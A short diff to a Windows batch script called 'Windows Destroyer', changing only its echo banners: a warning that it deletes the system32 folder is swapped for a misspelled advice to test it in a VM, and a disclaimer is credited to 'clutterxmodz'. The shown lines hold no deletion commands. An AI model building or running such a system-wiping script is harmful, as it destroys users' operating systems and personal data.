@@ -6,10 +6,10 @@ set version=1.0
 title Windows Destroyer %version%
 echo Welcome to the Windows destroyer.
 echo.
-echo This application will destroy Microsoft Windows by deleting the "system32" folder and other system folders.
+echo if you dont know a what is this prees exs in top cmd and if you know what is this test it in vm 
 echo.
 echo After a reboot of Microsoft Windows, Windows will no longer boot and you may lose personal data.
-echo I take NO RESPONSIBILITY for any data loss by you using this program.
+echo clutterxmodz will not take NO RESPONSIBILITY for any data loss by you using this program.
 echo.
 echo No data has been modified yet, you need to press 1 if you'd like to continue.
 echo.
